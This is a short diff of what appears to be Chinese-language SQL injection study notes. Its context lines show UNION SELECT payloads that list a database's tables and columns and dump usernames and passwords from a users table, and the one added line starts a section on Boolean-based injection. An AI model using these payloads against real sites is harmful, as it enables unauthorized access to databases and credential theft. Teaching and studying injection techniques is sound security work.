@@ -51,3 +51,4 @@ UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where t
 UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name='users' –+ 查询列名
 UNION SELECT 1,2,group_concat(id,username,password) from users –+ 查询字段值
 ```
+### 布尔注入
